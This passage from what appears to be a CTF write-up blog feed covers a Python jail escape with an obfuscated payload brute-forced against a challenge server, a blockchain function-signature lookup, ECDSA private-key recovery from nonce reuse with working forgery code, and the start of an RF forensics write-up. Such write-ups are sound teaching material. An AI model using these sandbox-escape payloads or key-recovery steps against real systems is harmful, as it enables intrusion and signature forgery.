7;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]+()._＿𝖉𝖔𝖈_＿[(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)+(&#x27;&#x27;==&#x27;&#x27;)]&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">400</span>): <span class="hljs-comment"># Brute force the index of the builtins subclass (it is almost certainly different on local than remote)</span><br>    <br>    <span class="hljs-comment"># Connect to server and construct payload</span><br>    r = remote(<span class="hljs-string">&#x27;35.222.133.12&#x27;</span>, <span class="hljs-number">5000</span>)<br>    code1 = <span class="hljs-string">&quot;()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[&#x27;&#x27;==&#x27;𝖈&#x27;]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[&quot;</span> + printTrue(i) + <span class="hljs-string">&quot;].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(&#x27;.&#x27;,&quot;</span><br>    code = code1 + code2 + <span class="hljs-string">&#x27;)&#x27;</span><br><br>    <span class="hljs-comment"># Send payload and retrieve the flag</span><br>    r.recvuntil(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>)<br>    r.sendline(code.encode())<br>    line = r.recvline().rstrip().decode()<br><br>    <span class="hljs-comment"># If we found the flag, then print it</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;uoft&#x27;</span> <span class="hljs-keyword">in</span> line:<br>        <span class="hljs-built_in">print</span>(line.rstrip())<br>        r.close()<br>        exit()<br>    r.close()<br></code></pre></td></tr></table></figure><p>Thanks for reading!</p><p><img src="/../images/uoftctf24/leo.gif" alt="gif"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP1PCTF 2023 - [Invitation] - Blockchain</title>
    <link href="/2023/10/15/tcp1p/"/>
    <url>/2023/10/15/tcp1p/</url>
    
    <content type="html"><![CDATA[<h1 id="Invitation"><a href="#Invitation" class="headerlink" title="Invitation"></a>Invitation</h1><p><img src="/../images/tcp1p/init.png" alt="chall"></p><div class="note note-danger">            <p><strong>Difficulty:</strong> <strong>Hard</strong><br><strong>Category:</strong> <strong>Blockchain</strong><br><strong>Flag:</strong> <strong><code>TCP1P{4_Bytes_SigNAtuRe_aS_4n_Invitation_congratz}</code></strong></p>          </div><p>We are given some bytecode in <code>101.txt</code>, and the challenge details in <code>101.txt</code> are as follows:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Description:<br>    You are provided a bytecode there, yeah?<br>    Find out a way <span class="hljs-keyword">to</span> get a certain <span class="hljs-keyword">function</span> name <span class="hljs-keyword">from</span> <span class="hljs-literal">it</span>,<br>    the correct <span class="hljs-keyword">function</span> name begin <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;TCP1P&quot;</span> string.<br><br>Flag Format<br>    <span class="hljs-keyword">if</span> you manage <span class="hljs-keyword">to</span> find the correct <span class="hljs-keyword">function</span> name<br>    <span class="hljs-keyword">do</span> the exact same thing <span class="hljs-keyword">as</span> the example below<br>    <br>    Found <span class="hljs-built_in">Function</span> name: TCP1P_th1s_1s_4_fl4g_<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">        -&gt;</span> remove the <span class="hljs-string">&quot;()&quot;</span><br>        -&gt; replace the first <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;&#123;&quot;</span><br>        -&gt; replace the last <span class="hljs-string">&quot;_&quot;</span> <span class="hljs-keyword">with</span> <span class="hljs-string">&quot;&#125;&quot;</span><br>    <br>    Final <span class="hljs-keyword">and</span> Right flag format: TCP1P&#123;th1s_1s_4_fl4g&#125;<br></code></pre></td></tr></table></figure><h3 id="Decompiling-the-Bytecode"><a href="#Decompiling-the-Bytecode" class="headerlink" title="Decompiling the Bytecode"></a>Decompiling the Bytecode</h3><p>First, let us decompile the bytecode. We head over to the <a href="https://library.dedaub.com/decompile">Dedaub decompiler</a> to decompile our bytecode. What we get is a mess, but we do see some strings in the decompiled code that hint towards using <code>Function DB</code>.</p><p><img src="/../images/tcp1p/image4.png" alt="bc"></p><p>Since the decompiled code wasn’t that helpful to us, let’s try another decompiler and hope it gives a better result. After pasting our bytecode into <a href="https://etherscan.io/bytecode-decompiler">Etherscan’s decompiler</a>, we indeed get some decompiled code, but wait a second, what’s this message?</p><p><img src="/../images/tcp1p/Image2.png" alt="decompiling"></p><p>Alright, whatever you say, Etherscan. We remove the construct prefix accordingly, and here’s a part of the decompiled result: </p><p><img src="/../images/tcp1p/Image3.png"></p><p>Huh, that’s interesting. The code is comparing <code>var0</code> to a bunch of 4-byte values, and they somehow correspond to functions (for example, <code>0x3d8a63e4</code> apparently corresponds to <code>scam()</code>). Here, we take a wild guess that these 4-byte values are the function signatures of all the functions available in the contract. </p><p>Indeed, we can verify our guess by calculating the signature of <code>scam()</code> ourselves!</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> keccak<br>k = keccak.new(digest_bits = <span class="hljs-number">256</span>)<br>k.update(<span class="hljs-string">b&#x27;scam()&#x27;</span>)<br><span class="hljs-built_in">print</span>(k.hexdigest()[:<span class="hljs-number">8</span>]) <span class="hljs-comment"># &#x27;3d8a63e4&#x27;, which matches 0x3d8a63e4 !</span><br></code></pre></td></tr></table></figure><h3 id="Function-DB"><a href="#Function-DB" class="headerlink" title="Function DB?"></a>Function DB?</h3><p>Now that we have a bunch of function signatures, we can just brute-force all possible functions until we get the flag, right?<br>No! Brute-forcing is obviously infeasible, so we turn to the next best option - <code>Function DB</code>. </p><p><code>Function DB</code> a.k.a <a href="https://www.4byte.directory/">Ethereum Signature Database</a> is a database that contains over a million function signatures and their corresponding human-readable representation.<br>For example, searching for <code>0x3d8a63e4</code> gives you <code>scam()</code>.</p><p><img src="/../images/tcp1p/Image5.png"></p><p>The next logical step would be to try all the function signatures and hope we find something in <code>Function DB</code>. And indeed we do!</p><p><img src="/../images/tcp1p/Image6.png"></p><p>We found the flag!</p><p><img src="/../images/tcp1p/cleared.png"></p><p>Was a very fun category, me and my team enjoyed this ctf a lot! Till next time.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>NahamconCTF - [Signed Jeopardy] - Crypto</title>
    <link href="/2023/06/17/nahamctf23/"/>
    <url>/2023/06/17/nahamctf23/</url>
    
    <content type="html"><![CDATA[<h1 id="Signed-Jeopardy"><a href="#Signed-Jeopardy" class="headerlink" title="Signed Jeopardy"></a>Signed Jeopardy</h1><p><img src="/../images/nahamctf23/into.png" alt="challenge"></p><div class="note note-warning">            <p><strong>Difficulty:</strong> <strong>Medium</strong><br><strong>Category:</strong> <strong>Cryptography</strong><br><strong>Flag:</strong> <strong><code>flag{a8168c41537604546394c13c8f4ef4b8}</code></strong></p>          </div><p>This writeup covers the challenge Signed Jeopardy from NahamConCTF 2023, which was probably the hardest crypto challenge in the competition, with only 44 solves. </p><p>In this challenge, we are given a file <code>server.sage</code> which implements the Elliptic Curve Digital Signature Algorithm (ECDSA) on the P521 curve. After generating the public key, the program opens a file called <code>questions.txt</code> and randomly selects questions about video game history and lore. It signs the answer to those questions and prints the question and signed answer to the console. The user can choose to receive questions and signed answers, and can also choose to sign a custom message. If the signature of the user’s message equals the signature calculated by the program, it gives the flag.</p><p><strong>server.sage:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>flag = f.read()<br><br>questions = []<br>answers = []<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;questions.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> f.readlines():<br>a = x.split(<span class="hljs-string">&#x27;\t&#x27;</span>)<br>questions.append(a[<span class="hljs-number">0</span>])<br>answers.append(a[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># P521 standard curve parameters</span><br>p = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057148</span><br>b = <span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>Gx = <span class="hljs-number">2661740802050217063228768716723360960729859168756973147706671368418802944996427808491545080627771902352094241225065558662157113545570916814161637315895999846</span><br>Gy = <span class="hljs-number">3757180025770020463545507224491183603594455134769762486694567779615544477440556316691234405012945539562144444537289428522585666729196580810124344277578376784</span><br>E = EllipticCurve(GF(p), [a, b])<br>G = E(Gx, Gy)<br>n = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397655394245057746333217197532963996371363321113864768612440380340372808892707005449</span><br>k = randint(<span class="hljs-number">1</span>,n-<span class="hljs-number">1</span>)<br>d = randint(<span class="hljs-number">1</span>,n-<span class="hljs-number">1</span>)<br>Pub = d*G<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nWhat service would you like?&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t1. Question&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t2. Flag&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\t3. Quit&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>():<br>index = randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(questions)-<span class="hljs-number">1</span>)<br>question = questions[index]<br>answer = <span class="hljs-string">&quot;What is &quot;</span>+answers[index].upper()+<span class="hljs-string">&quot;?&quot;</span><br>m_hash = <span class="hljs-built_in">int</span>(sha512(answer.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>P = k*G<br>r = <span class="hljs-built_in">int</span>(P[<span class="hljs-number">0</span>]) % n<br>s = ((m_hash + (r*d))/k)%n<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Here is the question: <span class="hljs-subst">&#123;question&#125;</span>\nAnd here is the signature: (<span class="hljs-subst">&#123;r&#125;</span>, <span class="hljs-subst">&#123;s&#125;</span>)&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please give the message&quot;</span>)<br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> answers:<br><span class="hljs-keyword">if</span> a.casefold() <span class="hljs-keyword">in</span> message.casefold():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I can&#x27;t have you using the answer of one of the questions as the message!&quot;</span>)<br>quit()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please give the r value of the signature&quot;</span>)<br>r_given = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Please give the s value of the signature&quot;</span>)<br>s_given = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>))<br>m_hash = <span class="hljs-built_in">int</span>(sha512(message.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>P = k*G<br>r = <span class="hljs-built_in">int</span>(P[<span class="hljs-number">0</span>]) % n<br>s = ((m_hash + (r*d))/k)%n<br><span class="hljs-keyword">if</span> r == r_given <span class="hljs-keyword">and</span> s == s_given:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;As promised, here&#x27;s your flag --&gt; <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>quit()<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not the right signature. HAHAHA!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Welcome to my ECDSA Jeopardy!\nHere is the public key:\nPublic key = <span class="hljs-subst">&#123;Pub&#125;</span>\nI&#x27;ll sign the answers and give them to you.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>menu()<br>choice = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&quot;</span>))<br><span class="hljs-keyword">if</span> choice == <span class="hljs-number">1</span>:<br>sign()<br><span class="hljs-keyword">elif</span> choice == <span class="hljs-number">2</span>:<br>get_flag()<br><span class="hljs-keyword">elif</span> choice == <span class="hljs-number">3</span>:<br>quit()<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid choice. Please try again.&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>main()<br></code></pre></td></tr></table></figure><p>After careful inspection of the code in <code>server.sage</code>, one can observe that the same nonce value <code>k</code> is reused to sign every answer. This is a critical implementation flaw in the ECDSA and the vulnerability which we will exploit in this challenge to retrieve the flag.</p><p>In the ECDSA, a random nonce value <code>k</code> is generated for each signature creation. The nonce value is used in conjunction with the private key to compute a point on the elliptic curve, which is in turn transformed into a valid signature. Since the purpose of the nonce is to provide randomness (uniqueness) to the signature generation process, it is of vital importance that <code>k</code> remains secret and is never reused. If it is reused, the attacker can directly compute <code>k</code> and the private key <code>d</code> and then forge signatures for arbitrary messages. As explained <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm">here</a>, if we have two messages <code>m1</code> and <code>m2</code> and their signatures <code>(r,s1)</code> and <code>(r,s2)</code>, we can compute the message hashes <code>z1</code> and <code>z2</code> and compute <code>k</code> and <code>d</code> by:</p><p><img src="/../images/nahamctf23/eqn.png" alt="eqn"></p><p>Thus, if we can select two questions from the server to answer - making sure to record the answer signatures - we can recompute <code>k</code> and <code>d</code> using the equations above. Then, we can choose an example message (such as “hello”) and compute its signature using the recovered values. Since we generate the signature using the same <code>k</code> and <code>d</code> used by the server, our signature should match the one computed by the server and we should be able to retrieve the flag!</p><p>First, let’s choose two simple questions to answer:<br><img src="/../images/nahamctf23/intro_msg.PNG" alt="intro_msg"><br><img src="/../images/nahamctf23/question1.PNG" alt="question 1"><br><img src="/../images/nahamctf23/question2.PNG" alt="question 2"></p><p>The answers to these questions are Microsoft and Mythical, respectively. Note that these are our messages <code>m1</code> and <code>m2</code>, and we can compute their hashes to find <code>z1</code> and <code>z2</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> * <span class="hljs-comment"># For elliptic curves</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha512 <span class="hljs-comment"># For hasing the message (we actually sign the HASH of the message, not the message itself)</span><br><span class="hljs-keyword">from</span> ecdsa.numbertheory <span class="hljs-keyword">import</span> inverse_mod <span class="hljs-comment"># inverse_mod == division (when moduli are involved)</span><br><br><span class="hljs-comment"># P521 standard curve parameters (from &#x27;server.sage&#x27;)</span><br>p = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151</span><br>a = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057148</span><br>b = <span class="hljs-number">1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984</span><br>Gx = <span class="hljs-number">2661740802050217063228768716723360960729859168756973147706671368418802944996427808491545080627771902352094241225065558662157113545570916814161637315895999846</span><br>Gy = <span class="hljs-number">3757180025770020463545507224491183603594455134769762486694567779615544477440556316691234405012945539562144444537289428522585666729196580810124344277578376784</span><br>E = EllipticCurve(GF(p), [a, b])<br>G = E(Gx, Gy) <br>n = <span class="hljs-number">6864797660130609714981900799081393217269435300143305409394463459185543183397655394245057746333217197532963996371363321113864768612440380340372808892707005449</span><br><br><span class="hljs-comment"># Note: n == the order of G (G == elliptic curve base point) which represents the total</span><br><span class="hljs-comment"># number of different possible points over the curve </span><br><br><span class="hljs-comment"># Question 1: Rare was bought by this company for $3.19 billion.</span><br>m1 = <span class="hljs-string">&quot;What is &quot;</span> + <span class="hljs-string">&quot;Microsoft&quot;</span>.upper() + <span class="hljs-string">&quot;?&quot;</span><br><br><span class="hljs-comment"># Question 2: Category of Pokemon that contain some Pokemon like Victini, Mew, Magearna and Zarude.</span><br>m2 = <span class="hljs-string">&quot;What is &quot;</span> + <span class="hljs-string">&quot;Mythical&quot;</span>.upper() + <span class="hljs-string">&quot;?&quot;</span><br><br><span class="hljs-comment"># Compute the SHA512 hashes of the answers</span><br>z1 = <span class="hljs-built_in">int</span>(sha512(m1.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>z2 = <span class="hljs-built_in">int</span>(sha512(m2.encode()).hexdigest(), <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure><p>Now that we have the hashes, we can use the signatures obtained from the server, <code>(r,s1)</code> and <code>(r,s2)</code>, to recover <code>k</code> and <code>d</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># Signature (r1, s1) of the first answer</span><br>r1 = <span class="hljs-number">1465592089909096066855017733143775914413407269725815519508066282537319512650079216133639660455072377153032233958108330075714003734901092347020299988719621322</span><br>s1 = <span class="hljs-number">545531076356108942170542517291585227912890321475211086646343990428230857512990453752368923962766593723868745103465428375270149723925686204794806188631057460</span><br><br><span class="hljs-comment"># Signature (r2, s2) of the second answer</span><br>r2 = <span class="hljs-number">1465592089909096066855017733143775914413407269725815519508066282537319512650079216133639660455072377153032233958108330075714003734901092347020299988719621322</span><br>s2 = <span class="hljs-number">4189612857039624039238953485069358484257973951950638665234391677969348904883268302761678805371275339935843305522229259291269025045916960785357191121407045404</span><br><br><span class="hljs-comment"># r must be equal for this to work (this is assumed, but we check just in case)</span><br><span class="hljs-keyword">assert</span>(r1 == r2)<br><br><span class="hljs-comment"># In the Elliptic Curve Digital Signature Algorithm, if the same k is used to sign</span><br><span class="hljs-comment"># different signatures (which is the case here), the attacker can recover k using</span><br><span class="hljs-comment"># the signatures (see https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm):</span><br>m_diff = (z1 - z2) % n<br>r1_inv = inverse_mod(r1, n)<br>s_diff = (s1-s2) % n<br><br><span class="hljs-comment"># Recover k and d using the formulas from the Wikipedia page</span><br><span class="hljs-comment"># Note that division is actually multiplication by the modular inverse!!</span><br>k = (m_diff * inverse_mod(s_diff, n)) % n<br>d = (((((s1 * k) % n) - z1) % n) * r1_inv) % n<br></code></pre></td></tr></table></figure><p>Finally, we can use <code>d</code> and <code>k</code> to forge a valid signature for our own message, “hello”:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># Now, sign a dummy message with the calculated keys and print out the signature</span><br>m_dummy = <span class="hljs-string">&quot;hello&quot;</span><br>m_dummy_hash = <span class="hljs-built_in">int</span>(sha512(m_dummy.encode()).hexdigest(), <span class="hljs-number">16</span>)<br>P = k*G<br>r = <span class="hljs-built_in">int</span>(P[<span class="hljs-number">0</span>]) % n<br>k_inv = inverse_mod(k, n)<br>s = (((m_dummy_hash + ((r*d)%n)) % n) * k_inv) % n<br><br><span class="hljs-comment"># Print the recovered values (k &amp; d) and the forged signature (r, s) to the console</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;k = <span class="hljs-subst">&#123;k&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;d = <span class="hljs-subst">&#123;d&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;r = <span class="hljs-subst">&#123;r&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;s = <span class="hljs-subst">&#123;s&#125;</span>\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">3716974158814584297095537945004349475177037436869930102241594403151123939279227740076878779097835920205545515879536767635099702998888815919895730302683232744</span><br><span class="hljs-attribute">d</span> <span class="hljs-operator">=</span> <span class="hljs-number">2127236813394369802820290684263172937266777532372353713359324496964461876839310236381964658762852218580616002669515460043669806824304374603332980809612018763</span><br><span class="hljs-attribute">r</span> <span class="hljs-operator">=</span> <span class="hljs-number">1465592089909096066855017733143775914413407269725815519508066282537319512650079216133639660455072377153032233958108330075714003734901092347020299988719621322</span><br><span class="hljs-attribute">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">1006240130706487892221434509613165618667388551054639964437917316108210445795964748208564217284113625941057144566952722652716045949564018952318007559836194459</span><br></code></pre></td></tr></table></figure><p>Here comes the moment of truth! Let’s submit our message <code>hello</code> and forged signature <code>(r,s)</code> to the server and see if it’s correct:<br><img src="/../images/nahamctf23/flag.PNG" alt="flag"></p><p>We got the flag! Moral of the story - <em>never</em> reuse your nonces!</p><p>Until next time…</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DanteCTF 2023 - [Radio Frequency] - Forensics</title>
    <link href="/2023/06/05/dante/"/>
    <url>/2023/06/05/dante/</url>
    
    <content type="html"><![CDATA[<h1 id="Imago-Qualitatis"><a href="#Imago-Qualitatis" class="headerlink" title="Imago Qualitatis"></a>Imago Qualitatis</h1><p><img src="/../images/dante/chall1.png" alt="Challenge"></p><div class="note note-success">            <p><strong>Difficulty:</strong> <strong>Easy</strong><br><strong>Category:</strong> <strong>Forensics</strong><br><strong>Flag:</strong> <strong><code>DANTE{n3w_w4v35_0ld_5ch00l}</code></strong></p>          </div><p>First as always , lets download the file and see what we can do. This can take sometime since its not a small download (834 MB).</p><p><img src="/../images/dante/initd1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>As we can see its a 7-Zip archive, lets extract what’s inside this zip by running this command<br><strong><code>7z e ImagoQualitatis.7z</code></strong> .</p><p><img src="/../images/dante/file1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>Great, we extracted the file successfully ! I checked what type of file we are working with but no useful results came up, as well as I noticed that the size of it is very large being 4.6 GB. On top of that I also checked the file header , no luck there either even after some googling. We for sure know its something to do with <strong>RF</strong> so i researched a bit on software used to open such files, and to my luck i found a software called <code>GQRX</code>, which also is mentioned in the file name !</p><p><strong>Let’s install it and give it a shot</strong></p><p><img src="/../images/dante/rad1.png" alt="C0ULD N0T B3 L04AD3D"></p><p>Interesting okay , time to try to open the file with that software and see if we get any 